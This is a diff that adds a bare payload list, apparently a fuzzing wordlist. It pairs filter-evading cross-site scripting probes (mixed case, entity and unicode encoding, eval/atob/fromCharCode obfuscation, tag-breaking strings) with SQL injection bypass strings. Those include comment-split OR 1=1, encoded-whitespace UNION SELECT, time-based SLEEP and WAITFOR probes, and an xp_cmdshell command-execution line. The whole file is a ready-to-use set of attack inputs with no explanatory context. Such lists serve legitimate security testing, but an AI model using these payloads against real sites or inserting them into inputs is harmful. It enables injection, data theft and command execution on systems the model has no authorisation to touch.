@@ -1,0 +1,95 @@
+<ScRiPt>alert(1)</ScRiPt>
+<script/x>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<script>&#97;&#108;&#101;&#114;&#116;(1)</script>
+<script>\u0061lert(1)</script>
+<script>window['ale'+'rt'](1)</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+<img src=x onerror=alert(1)>
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+' /*!OR*/ 1=1--
+' /*!50000OR*/ 1=1--
+'/**/OR/**/1=1--
+' OR/**/1=1--
+1/**/UNION/**/SELECT/**/NULL--
+1 UNION%20SELECT%20NULL--
+1 UNION SELECT%09NULL--
+1 UNION SELECT%0aNULL--
+1%20UNION%20SELECT%20NULL--
+1+UNION+SELECT+NULL--
+1%09UNION%09SELECT%09NULL--
+' OR 1=1 LIMIT 1;%00
+%27 OR 1=1--
+%27%20OR%201=1--
+%27%09OR%091=1--
+1;SELECT+SLEEP(5)--
+1;SELECT%09SLEEP(5)--
+1;SELECT%0aSLEEP(5)--
+';WAITFOR%20DELAY%20'0:0:5'--
+'; EXEC('xp_'+'cmdshell''whoami''')--
+<iMg SrC=x OnErRoR=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src="x" onerror="alert(1)">
+<a href="JAVAscript:alert(1)">click</a>
+<a href="JAVASCRIPT:alert(1)">click</a>
+<a href="JavaScript:alert(1)">click</a>
+<a href="java&#115;cript:alert(1)">click</a>
+<a href="java&#83;cript:alert(1)">click</a>
+<a href=java&#0;script:alert(1)>click</a>
+<svg><SCRIPT>alert(1)</SCRIPT>
+<math><SCRIPT>alert(1)</SCRIPT>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+<script>window.onerror=alert;throw 1</script>
+<script>self[/alert/.source](1)</script>
+<script>[1].find(alert)</script>
+<script>[1].forEach(alert)</script>
+<script>Object.keys({alert:alert}).map(alert)</script>
+<script>({alert}).alert(1)</script>
+<script>new Function`al\ert\`1\``</script>
+<script>Function("ale"+"rt(1)")()</script>
+<script>setTimeout`alert\x281\x29`</script>
+<script>alert(1)</script >
+< script>alert(1)</ script>
+<script >alert(1)</script >
+<script	>alert(1)</script>
+<script%09>alert(1)</script>
+<script%0a>alert(1)</script>
+<script%0d>alert(1)</script>
+<script%20>alert(1)</script>
+<script/src=x>alert(1)</script>
+<script language="javascript">alert(1)</script>
+<script LANGUAGE="javascript">alert(1)</script>
+<script type="text/javascript">alert(1)</script>
+<script type="text/vbscript">MsgBox(1)</script>
+<script charset="utf-8">alert(1)</script>
+<script defer>alert(1)</script>
+<script async>alert(1)</script>
+'/**/OR/**/1=1--
+'/*comment*/OR/*comment*/1=1--
+'%20/*!OR*/1=1--
+'%20OR%201=1%20AND%20'1'='1
+'%0aOR%0a1=1--
+'%09OR%091=1--
+'%0dOR%0d1=1--
+1'/**/UNION/**/SELECT/**/NULL,NULL--
+1'/*!UNION*//*!SELECT*/NULL,NULL--
+1'%20UNION%20SELECT%20NULL,NULL--
+1'+UNION+SELECT+NULL,NULL--
+1'%0aUNION%0aSELECT%0aNULL,NULL--
+1'%09UNION%09SELECT%09NULL,NULL--
+<img src=1 href=1 onerror=alert(1)>
+<img src=1 href=1 onerror="alert(1)">
+<img src=1 href=1 onerror='alert(1)'>
+<img src=1 href=1 onerror=&#97;lert(1)>
+<img src=1 href=1 onerror=\x61lert(1)>
+<img src=1 href=1 onerror=\u0061lert(1)>
